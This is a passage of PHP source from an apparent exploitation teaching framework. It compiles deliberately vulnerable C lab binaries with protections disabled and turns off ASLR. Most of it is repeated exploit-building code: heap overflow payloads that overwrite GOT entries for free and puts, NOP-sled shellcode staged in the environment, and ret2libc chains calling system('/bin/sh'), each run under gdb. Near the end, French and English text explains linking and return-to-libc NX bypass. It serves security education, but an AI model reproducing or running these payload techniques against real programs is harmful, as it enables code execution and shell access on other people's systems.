		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*($offset_eip-3)+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################
		exit();
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_malloc_1";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$file_bin = new ret2heap4linux($programme);
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$addr = $file_bin->elf2addr4fonction_prog("winner");
		$addr = $file_bin->hex2rev_32($addr);
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"'";
		$file_bin->payload2check4norme($cmd, "");
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->requette($query) ;
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		####################################################################################
		
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_malloc_1";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$file_bin = new ret2heap4linux($programme);
		
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$addr = $file_bin->elf2addr4shellcode2env(0,$file_bin->shellcode_date_linux);
		$addr = $file_bin->hex2rev_32($addr);
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$file_bin->requette($query) ;
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		####################################################################################
		
		
		####################### NO ########################################################
		$name = "ret2heap4linux_malloc_1";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$file_bin = new ret2heap4linux($programme);
		
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$addr_system = $file_bin->hex2rev_32($file_bin->elf2addr4fonction_prog("system"));;
		$addr_bin_sh = $file_bin->hex2rev_32($file_bin->elf2addr4bin_sh_only());
		$addr_exit = $file_bin->hex2rev_32($file_bin->elf2addr4fonction_prog("exit"));
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_system\"+\"$addr_bin_sh\"+\"$addr_exit\"'";
		$query = "$file_bin->file_path \$($cmd)";
		
		$file_bin->payload2check4norme($cmd, "");
		$file_bin->requette($query) ;
		$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		####################################################################################
		
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_malloc_2";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$argv = "AAAA BBBB";
		$this->requette("$programme $argv");
		$file_bin = new ret2heap4linux($programme);
			
		$what = $file_bin->elf2addr4fonction_prog("winner");
		$what = $file_bin->hex2rev_32($what);
		
		$this->pause();
		//$offset_eip = $file_bin->elf2fuzzeling("","BBBB");$this->pause();
		$offset_eip = 20 ;$this->pause();
		//$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"+\"\\x90\"*$nops+\"$shellcode\"'";
		$wheres = $file_bin->elf2addr4got_all();
		foreach ($wheres as $where => $fonction ){
		    $this->ssTitre("TRY with FUNCTION: $fonction");
		    $where = $file_bin->hex2rev_32($where);
		    $cmd_where = "python -c 'print \"\\x41\"*$offset_eip+\"$where\"'";
		    $cmd_what = "python -c 'print \"$what\"'";
		    $query = "$file_bin->file_path `$cmd_where` `$cmd_what` ";
		    $file_bin->requette($query) ;
		}
		
		$where = $file_bin->elf2addr4got_function("puts","");
		$where = $file_bin->hex2rev_32($where);
		$cmd_where = "python -c 'print \"\\x41\"*$offset_eip+\"$where\"'";
		$cmd_what = "python -c 'print \"$what\"'";
		$query = "$file_bin->file_path `$cmd_where` `$cmd_what` ";
		$file_bin->requette($query) ;
		$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		####################################################################################
		
		exit();

		####################### ONE BYTE ########################################################
		$name = "ret2heap4linux_vulndev1";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","BBBB");		
		//$offset_eip = $offset_eip -4;
		//$offset_eip = 252;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		$ret = $file_bin->elf2ltrace("", " | grep malloc | head -1 | cut -d= -f2");
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		$addr_ret = $file_bin->hex2rev_32($file_bin->addr2add($ret,8));
		$cmd = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip-8-".$this->hex2size($shellcode)."-1-8-1)+\"\\x00\"+\"$addr_got\"+\"$addr_ret\"+\"\\x00\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		exit();
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"' ";
		$query = "$file_bin->file_path \$($cmd) \"BBBB\"";
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd) \"BBBB\"\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display(($offset_eip/2), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################

		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc2";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = $offset_eip -4;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub("0x080497cc",12));
		
		//$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################
		
		


		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc8";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = 680;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$ret = $file_bin->elf2ltrace("", "| grep malloc | head -1 | cut -d= -f2");
		//$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		
		$shellcode = "\\xeb\\x0assppppffff".$file_bin->shellcode_date_linux;
		
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		$addr_ret = $file_bin->hex2rev_32($file_bin->addr2add($ret,16));
		$cmd = "python -c 'print \"\\x41\"*16+\"$shellcode\"+\"\\x42\"*569+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_ret\"+\"\\x00\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		
		
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc7";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = $offset_eip -4;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc6";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = $offset_eip -4;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################
		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc5";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);	
		
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = $offset_eip -4;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);

		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
        $filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################
	
		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc4";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = $offset_eip -4;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################

		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc1";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$offset_eip = $offset_eip -4;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		
		$shellcode = $file_bin->asm2hex("jmp 12")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		// +\"\\x42\"*4
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr_less_4\"+\"$addr_less_4\"+\"$addr_got\"+\"$addr_shellcode\"'";
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->payload2check4norme($cmd, "");
		$filter = "";
		$file_bin->requette($query) ;$this->pause();
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		//$file_bin->elf2heap4display(($offset_eip+$offset_eip/4), $cmd, $filter);
		//$file_bin->elf2syscall4bt("malloc", "free", $cmd);
		//$file_bin->elf2ltrace("AAAA","");
		####################################################################################

			
		$name = "ret2heap4linux_0";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$this->pause();
		
		$name = "ret2heap4linux_1";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$this->pause();
		
		$name = "ret2heap4linux_2";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$this->pause();
		
		$name = "ret2heap4linux_3";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$this->requette("$programme AAAA");
		$this->pause();
		
		$file_bin->ret2heap4linux_intro();
		$this->pause();
		}
	
	
	
	
	public function poc4bof2ret2lib4linux(){
		$timestamp_debut = $this->start("Return to Libc","\n-1 System + exit + cmd (in memory) \n-2 System + exit + cmd (in argv) -3 execve");
	
		$this->chapitre("RETURN TO LIBRARY");

		$name = "poc";
		$rep_path = "$this->dir_tmp/ret2lib4linux";
		if (!is_dir($rep_path)) $this->create_folder($rep_path);
		$rep_path = "$this->dir_tmp/ret2lib4linux/$name";
		if (!is_dir($rep_path)) $this->create_folder($rep_path);
		
		$this->img("$this->dir_img/bof/rop5.png");
	
		$this->titre("return to libc" );
		$this->article("compilation static VS dynamic","Rappels théoriques
Tout d’abord, il convient de faire quelques rappels sur la compilation et l’édition de liens des binaires.
Quand on compile un programme qui fait appel à des fonctions situées dans d’autres bibliothèques(telles que la librairie standard), l’édition de liens peut être faite de deux façons différentes.
La première méthode, dite statique, consiste à intégrer à l’exécutable toutes les librairies dont il a besoin pour fonctionner.
A l’exécution, tous les symboles sont donc résolus, et les appels sont immédiats.
Si cette méthode a été la plus utilisée dans les versions anciennes des OS, elle est toutefois largement dépassée.
En effet, il s’agit d’un gouffre à espace disque, puisqu’elle oblige à dupliquer chaque librairie autant de fois qu’il y a d’exécutables qui l’utilisent.
Les exécutables générés sont donc volumineux, puisqu’il suffit par exemple d’un simple appel à printf() pour que toute la librairie standard du C soit intégrée à l’exécutable !
Depuis les versions « récentes » de Linux, c’est la deuxième méthode d’édition de liens, dite dynamique, qui est utilisée par défaut.
Avec cette méthode, chaque librairie est compilée une fois pour toute dans une librairie dynamique, ou partagée(shared) ayant l’extension .so(équivalent des .dll sous Windows).
Lorsque l’on compile un programme qui y fait référence, on y insère juste le nom du symbole(fonction ou variable) dont il a besoin, ainsi que le nom de la librairie.
C’est à l’exécution du programme que l’éditeur de liens dynamique(ou dynamic linker), nommé ld.so, charge les libraires nécessaire et effectue la résolution des symboles manquants en temps réel.
C’est donc la vitesse d’exécution qui s’en retrouve pénalisée, même si nous verrons que cette perte est toutefois relative car compensée par un système de mise en cache des adresses.");
		$this->article("Avantages d'une bibliotheque statique", "L'executable est completement autonome Edition de lien reussie -> fonctionnement immuable");
		$this->article("Inconvenients d'une bibliotheeque statique","Duplication des modules dans l'executable
  Consommation d'espace disque(gros executables)
  Consommation de memoire(pas de partage inter-processus)
  Executable insensible aux mises a jour des bibliotheques utilitaires");
		$this->article("Returning to libc", " is a method of exploiting a buffer overflow on a system that has a non-executable stack, it is very similar to a standard buffer overflow, in that the return address is changed to point at a new location that we can control.
However since no executable code is allowed on the stack we can't just tag in shellcode.
This is the reason we use the return into libc trick and utilize a function provided by the library.
We still overwrite the return address with one of a function in libc, pass it the correct arguments and have that execute for us.
Since these functions do not reside on the stack, we can bypass the stack protection and execute code.
bypass NX = bypass stack executable = + shellcode non exec in stack -> libc(build our shellcode ) = without gcc -z execstack " );
		$this->ssTitre("Bypassing non-executable-stack during exploitation using return-to-libc" );
	
		$this->note("Remove -z execstack");
	
		/*
		$vm_ub12042 = new vm("$this->dir_vm/ub12042/ub12042.vmx");
		$vm_ub12042->vm2upload("$this->dir_c/ret2libc32l.c","/tmp/ret2libc32l.c");
		$this->cmd("ub12042","gcc /tmp/ret2libc32l.c -o /tmp/ret2libc32l -w -fno-pie -z norelro -ggdb -fno-stack-protector  -m32 -mtune=i386 -static ");
		$this->pause();
		$vm_ub12042->vm2download("/tmp/ret2libc32l", "$this->dir_tmp/ret2libc32l");
		$this->pause();
		*/
		
		$this->os2aslr4no();
	
	
		$name = "ret2lib32l";
		
		
		
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static 
		$ret2lib = $bin->file_c2elf(" -std=c99 -fno-pie -fno-stack-protector -mpreferred-stack-boundary=2 -m32 -mtune=i386 -z norelro -ldl");
		$file_bin = new ret2lib4linux($ret2lib);
	
		$overflow = $file_bin->elf2fuzzeling("",""); 
		
		$offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
		$file_bin->elf2checksec();
		
		$this->pause ();
		
		$file_bin->ret2lib4linux_methode1($offset_eip,32); // OK
		
		$file_bin->ret2lib4linux_methode2($offset_eip); // OK

		$file_bin->ret2lib4linux_gets($offset_eip);  // OK
		
